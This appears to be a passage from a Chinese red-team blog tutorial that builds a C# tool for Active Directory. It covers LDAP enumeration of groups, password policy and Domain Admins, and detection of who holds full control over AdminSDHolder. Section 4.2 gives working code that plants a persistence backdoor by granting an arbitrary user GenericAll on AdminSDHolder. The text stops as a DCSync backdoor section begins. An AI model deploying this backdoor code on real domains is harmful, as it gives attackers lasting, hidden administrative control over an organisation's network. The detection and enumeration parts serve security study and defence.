+<p>首先通过Ldapcoon类的LDAP_COON()方法获取域内节点coon，和可以用来搜索的search。域内就会返回域内的DirectoryEntry和DirectorySearcher对象，域外就会返回域外的DirectoryEntry和DirectorySearcher对象。<br>​</p>
+<p>后面一些其他的就不再详讲<br>​</p>
+<p>查询域内组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllGroups()</span><br><span class="line"> &#123;</span><br><span class="line">     try</span><br><span class="line">     &#123;</span><br><span class="line">         Ldapcoon.LDAP_COON();</span><br><span class="line">         Ldapcoon.search.Filter = &quot;(&amp;(objectCategory=group))&quot;;</span><br><span class="line">         Font.InfoFonts();</span><br><span class="line">         Console.WriteLine(&quot;===========All Groups===========&quot;);</span><br><span class="line">         Font.NormailFonts();</span><br><span class="line">         foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">         &#123;</span><br><span class="line">             string groups = &quot;&quot;;</span><br><span class="line">             string groupdescription = &quot;&quot;;</span><br><span class="line">             groups = r.Properties[&quot;cn&quot;][0].ToString();</span><br><span class="line">             Console.WriteLine(&quot;Group: &quot; + groups);</span><br><span class="line">             //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">             //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     catch</span><br><span class="line">     &#123;</span><br><span class="line">         Font.Warning();</span><br><span class="line">         Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">         Font.NormailFonts();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>域内密码策略：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public static void GetPassPolicy()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========Pass Policy===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        SearchResult r = Ldapcoon.search.FindOne();</span><br><span class="line">        long maxDays = 0;</span><br><span class="line">        long minDays = 0;</span><br><span class="line">        Int64 maxPwdAge = 0;</span><br><span class="line">        Int64 minPwdAge = 0;</span><br><span class="line">        string minPwdLength = &quot;&quot;;</span><br><span class="line">        string lockoutThreshold = &quot;&quot;;</span><br><span class="line">        Int64 lockoutDuration = 0;</span><br><span class="line">        long lockTime = 0;</span><br><span class="line"></span><br><span class="line">        maxPwdAge = (Int64)r.Properties[&quot;maxPwdAge&quot;][0];</span><br><span class="line">        maxDays = maxPwdAge / -864000000000;</span><br><span class="line"></span><br><span class="line">        minPwdAge = (Int64)r.Properties[&quot;minPwdAge&quot;][0];</span><br><span class="line">        minDays = minPwdAge / -864000000000;</span><br><span class="line"></span><br><span class="line">        minPwdLength = r.Properties[&quot;minPwdLength&quot;][0].ToString();</span><br><span class="line"></span><br><span class="line">        lockoutThreshold = r.Properties[&quot;lockoutThreshold&quot;][0].ToString();</span><br><span class="line"></span><br><span class="line">        lockoutDuration = (Int64)r.Properties[&quot;lockoutDuration&quot;][0];</span><br><span class="line">        lockTime = lockoutDuration / -864000000000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(&quot;最小修改密码时间:&quot; + minDays);</span><br><span class="line">        Console.WriteLine(&quot;最大修改密码时间:&quot; + maxDays);</span><br><span class="line">        Console.WriteLine(&quot;最小密码长度:&quot; + minPwdLength);</span><br><span class="line">        Console.WriteLine(&quot;多少次锁定:&quot; + lockoutThreshold);</span><br><span class="line">        Console.WriteLine(&quot;锁定持续时间:&quot; + lockTime);</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>域管</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllAdmins()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=group)(cn=Domain Admins))&quot;;</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========All Domain Admins===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            int domain_users_count = 0;</span><br><span class="line">            string domain_users = &quot;&quot;;</span><br><span class="line">            int len = 0;</span><br><span class="line">            domain_users_count = r.Properties[&quot;member&quot;].Count;</span><br><span class="line">            while(len &lt; domain_users_count)</span><br><span class="line">            &#123;</span><br><span class="line">                domain_users = r.Properties[&quot;member&quot;][len].ToString();</span><br><span class="line">                len++;</span><br><span class="line">                if (domain_users.Contains(&quot;User&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(domain_users);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">                                           </span><br></pre></td></tr></table></figure>
+
+<p>这里查询域管，我是这样进行处理的，我们先通过ldapsearch来查看返回结果<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img5@main/2021/10/01/1633088452249-ac636722-4320-4a0d-bef1-3ea3d85ab70d.png"></p>
+<p>然后我获取member的数量然后看里面是否包含user来输出。</p>
+<h2 id><a href="#" class="headerlink" title></a></h2><h1 id="0x04-AdminSDHolder检测与后门用户添加"><a href="#0x04-AdminSDHolder检测与后门用户添加" class="headerlink" title="0x04 AdminSDHolder检测与后门用户添加"></a>0x04 AdminSDHolder检测与后门用户添加</h1><h2 id="4-1-检测"><a href="#4-1-检测" class="headerlink" title="4.1 检测"></a>4.1 检测</h2><p>AdminSDHolder是对CN=AdminSDHolder,CN=System,DC=redteam,DC=local这个cn拥有完全控制权限的用户，我们前面说到<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br></pre></td></tr></table></figure>
+
+<p>这里的searchroot就是查询的根地址我们就需要绑定到CN=AdminSDHolder,CN=System,DC=redteam,DC=local这里来也就是说url为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LDAP://192.168.11.16/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br><span class="line">或者为</span><br><span class="line">LDAP://redteam/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br></pre></td></tr></table></figure>
+
+<p>每个域的名字都不一样所以我们要来获取对象的DC=redteam,DC=local和redteam这个值。<br>​</p>
+<p>这里我们来创建一个public_value类也就是公共值类。<br>​</p>
+<p>我们通过adexplorer来可以看到distinguishedName的值就为我们需要的。<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088468976-fab86b78-5cf2-4087-a996-0bd9db2b4f4b.png"></p>
+<p>我们可以看到objectClass为domainDNS.<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088478583-804062c4-3827-4e72-b253-dae9bd7d5044.png"></p>
+<p>所以我们的filter为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=domainDNS))</span><br></pre></td></tr></table></figure>
+
+<p>这里先用ldapsearch来进行查询<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img17@main/2021/10/01/1633088490189-cd528aeb-2f9d-48e4-b0c0-80e9c84d720e.png"></p>
+<p>所以我们可以写一个方法来获取了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//获取DC=redteam,DC=local这个值</span><br><span class="line">public static String GetdistinguishedName()</span><br><span class="line">&#123;</span><br><span class="line">    string Domain_DNS_Name = &quot;&quot;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=domainDNS))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domainDNS_Name = &quot;&quot;;</span><br><span class="line">            domainDNS_Name = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">            Domain_DNS_Name = domainDNS_Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">    return Domain_DNS_Name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>同理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088501243-7be00078-8a63-4da1-8d33-c31640484d97.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//获取readteam这个值</span><br><span class="line">public static String Get_Dns_First_Name()</span><br><span class="line">&#123;</span><br><span class="line">    string Dns_First_Name = &quot;&quot;;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=domainDNS))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domainDC_Name = &quot;&quot;;</span><br><span class="line">            domainDC_Name = r.Properties[&quot;dc&quot;][0].ToString();</span><br><span class="line">            Dns_First_Name = domainDC_Name;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">    return Dns_First_Name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么现在就可以绑定adminsdholder路径了<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//首先获取DC=redteam,DC=local这个值</span><br><span class="line">         string distinguishedName = &quot;&quot;;</span><br><span class="line">         distinguishedName = public_value.GetdistinguishedName();</span><br><span class="line">         //然后获取readteam这个值</span><br><span class="line">         string dc = &quot;&quot;;</span><br><span class="line">         dc = public_value.Get_Dns_First_Name();</span><br><span class="line">         if (dc != &quot;&quot; &amp;&amp; distinguishedName != &quot;&quot;)</span><br><span class="line">         &#123;</span><br><span class="line">             //进行拼接如果在域内可以直接拼接为以下</span><br><span class="line">             //LDAP://redteam/CN=AdminSDHolder,CN=System,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">             bool flag = public_value.isindomain();</span><br><span class="line">             string AdminSDHolder_path = &quot;&quot;;</span><br><span class="line">             if (flag)</span><br><span class="line">             &#123;</span><br><span class="line">                 AdminSDHolder_path = &quot;LDAP://&quot; + dc + &quot;/CN=AdminSDHolder,CN=System,&quot; + distinguishedName;</span><br><span class="line">             &#125;</span><br><span class="line">             else</span><br><span class="line">             &#123;</span><br><span class="line">                 AdminSDHolder_path = &quot;LDAP://&quot; + GetArgsValue.domain + &quot;/CN=AdminSDHolder,CN=System,&quot; + distinguishedName;</span><br><span class="line">             &#125;</span><br><span class="line">             Ldapcoon.coon.Path = AdminSDHolder_path;</span><br></pre></td></tr></table></figure>
+
+<p>这里为了方便我写了个isindomain放来来判断是否在域内还是在域外<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//判断域内还是域外</span><br><span class="line">public static bool isindomain()</span><br><span class="line">&#123;</span><br><span class="line">    if (GetArgsValue.user != &quot;&quot; &amp;&amp; GetArgsValue.pass != &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>我们需求很简单就是要获取哪些用户对adminsdholder这个cn拥有完全控制权限。<br>​</p>
+<p>DirectoryEntry类有个属性叫做ObjectSecurity作用是获取或设置此项的安全说明符。这个详细请自行查看msdn。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectorySecurity sec = Ldapcoon.coon.ObjectSecurity;</span><br><span class="line">           AuthorizationRuleCollection rules = null;</span><br><span class="line">           rules = sec.GetAccessRules(true, true, typeof(NTAccount));</span><br><span class="line">           foreach (ActiveDirectoryAccessRule rule in rules)</span><br><span class="line">           &#123;</span><br><span class="line">               if (rule.ActiveDirectoryRights.ToString().Equals(&quot;GenericAll&quot;))</span><br><span class="line">               &#123;</span><br><span class="line">                   string acl = rule.IdentityReference.Value;</span><br><span class="line">                   if (acl.Contains(&quot;-&quot;))</span><br><span class="line">                   &#123;</span><br><span class="line">                       //域外查询可能会出现用户名为sid的情况。所以需要转换</span><br><span class="line">                       //Console.WriteLine(acl);</span><br><span class="line">                       string user_name = public_value.SidToUserName(acl);</span><br><span class="line">                       if(user_name != &quot;error&quot;)</span><br><span class="line">                       &#123;</span><br><span class="line">                           Console.WriteLine(user_name);</span><br><span class="line">                       &#125;  </span><br><span class="line">                   &#125;</span><br><span class="line">                   else</span><br><span class="line">                   &#123;</span><br><span class="line">                       Console.WriteLine(acl);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取到coon的安全说明符后调用GetAccessRules方法获取与指定的安全性标识符关联的访问规则的集合。也就是说获取我们这个节点的规则集合，然后用foreach来循环判断。当用户的ActiveDirectoryRights也就是权限为GenericAll我们就输出出来他的名字，也就是对adminsdholder这个拥有完全控制权限的用户。当我们在域外的时候我们获取到的用户可能是sid，所以我们还需要让sid转换为域内用户名字。当然这个用户可能是一个user，group或者一个computer<br>​</p>
+<p>这里调用了public_value的SidToUserName方法。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">//sid to username</span><br><span class="line">public static string SidToUserName(string sid)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        string url = &quot;LDAP://&quot; + GetArgsValue.domain + &quot;/&lt;SID=&quot; + sid + &quot;&gt;&quot;;</span><br><span class="line">        Ldapcoon.coon.Path = url;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string users = &quot;&quot;;</span><br><span class="line">            users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (users != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return users;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=group))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string groups = &quot;&quot;;</span><br><span class="line">            groups = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (groups != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return groups;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=computer))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string computers = &quot;&quot;;</span><br><span class="line">            computers = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (computers != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return computers;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;error&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在ldap用支持以下语法这种形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDAP://192.168.11.16/&lt;SID=xxxxxxxxxx&gt;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们把sid带入，设置coon.path为该用户再通过(&amp;(objectClass=user)(objectCategory=person))过滤条件搜索出来，比如<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088516986-4eaffbea-f3dc-48c2-b0bd-21a003d74749.png"></p>
+<p>我们绑定了hack用户为rootpath，那么通过过滤条件搜索出来的也是它自己，因为它没有子节点了。然后获取他的name值，当获取到的不为空就返回，否则就返回error，然后在adminsdholder检测代码这边我们写道<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string acl = rule.IdentityReference.Value;</span><br><span class="line">if (acl.Contains(&quot;-&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    //域外查询可能会出现用户名为sid的情况。所以需要转换</span><br><span class="line">    //Console.WriteLine(acl);</span><br><span class="line">    string user_name = public_value.SidToUserName(acl);</span><br><span class="line">    if(user_name != &quot;error&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(user_name);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+
+<p>当user_name不为error的时候就会输出，那么什么时候会输出error呢？假如我们以前有一个用户为qqq，然后他对adminsdholder这个组拥有完全控制权限，但是我们后来把这个用户删除了，他就会到一个CN=Deleted Objects里面他的sid就为url就为下面这个然后我们的LDAP://redteam/&lt;SID=xxx&gt;就会失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=qqqDEL:67e38247-2727-4c5a-8704-c9f33ad747da,CN=Deleted Objects,DC=redteam,DC=local</span><br></pre></td></tr></table></figure>
+
+<p>我们在匹配谁对adminsdholder拥有完全控制权限的时候还是会检测到。就搜索失败返回error，这里我们获取到error的直接continue。<br>​</p>
+<h2 id="4-2-添加"><a href="#4-2-添加" class="headerlink" title="4.2 添加"></a>4.2 添加</h2><p>前面同理我们需要设置rootpath</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Ldapcoon.LDAP_COON();</span><br><span class="line">//获取DC=redteam,DC=local</span><br><span class="line">string distinguishedName = &quot;&quot;;</span><br><span class="line">string domainname = &quot;&quot;;</span><br><span class="line">domainname = public_value.Get_Dns_First_Name();</span><br><span class="line">distinguishedName = public_value.GetdistinguishedName();</span><br><span class="line"></span><br><span class="line">//string AdminSDHolder_Path = &quot;LDAP://192.168.11.16/CN=System,DC=redteam,DC=local&quot;;</span><br><span class="line">string AdminSDHolder_Path = &quot;LDAP://&quot; + domainname + &quot;/&quot; + &quot;CN=System,&quot; + distinguishedName;</span><br><span class="line">//Console.WriteLine(AdminSDHolder_Path);</span><br><span class="line">Ldapcoon.coon.Path = AdminSDHolder_Path;</span><br></pre></td></tr></table></figure>
+
+<p>赋予用户对adminsdholder完全控制权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">foreach (DirectoryEntry computer in Ldapcoon.coon.Children)</span><br><span class="line">&#123;</span><br><span class="line">    if (computer.Name == &quot;CN=AdminSDHolder&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        ActiveDirectorySecurity sdc = computer.ObjectSecurity;</span><br><span class="line">        NTAccount Account = new NTAccount(username);</span><br><span class="line">        SecurityIdentifier Sid =(SecurityIdentifier)Account.Translate(typeof(SecurityIdentifier));</span><br><span class="line">        ActiveDirectoryAccessRule rule = new ActiveDirectoryAccessRule(Sid,ActiveDirectoryRights.GenericAll,AccessControlType.Allow);</span><br><span class="line">        sdc.SetAccessRule(rule);</span><br><span class="line">        computer.CommitChanges();</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;AdminSDHolder back door add user &quot;+ username + &quot; success!!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先遍历节点当节点为CN=AdminSDHolder的时候获取他的安全规则集合<br>​</p>
+<p>然后我们看到ActiveDirectoryAccessRule类：用于表示 Active Directory 域服务对象的自由访问控制列表 (DACL) 中的访问控制项 (ACE)。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectoryAccessRule(IdentityReference, ActiveDirectoryRights, AccessControlType)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到第一个参数为一个IdentityReference对象，第二个参数为访问规则权限的一个或多个，第三个参数为访问规则类型。<br>​</p>
+<p>我们前面的account为NTAccount类型，我们可以通过Translate把他转换为IdentityReference类型，然后第二个我们设置为GenericAll，第三个设置为允许。我们设置了这个规则后可以通过SetAccessRule方法来设置。<br>​</p>
+<p>最后通过CommitChanges方法来进行添加。<br>​</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img11@main/2021/10/01/1633088532594-ada9c117-a54f-4d77-b713-43b2fad42b83.png"></p>
+<h1 id="0x05-Dcsync检测与后门用户添加"><a href="#0x05-Dcsync检测与后门用户添加" class="headerlink" title="0x05 Dcsync检测与后门用户添加"></a>0x05 Dcsync检测与后门用户添加</h1><h2 id="5-1-检测"><a href="#5-1-检测" class="headerlink" title="5.1 检测"></a>5.1 检测</h2><p>当用户对根域拥有完全控制权限或者拥有以下三条ace或者对以下权限打勾的时候就能dcsync。<br>​</p>
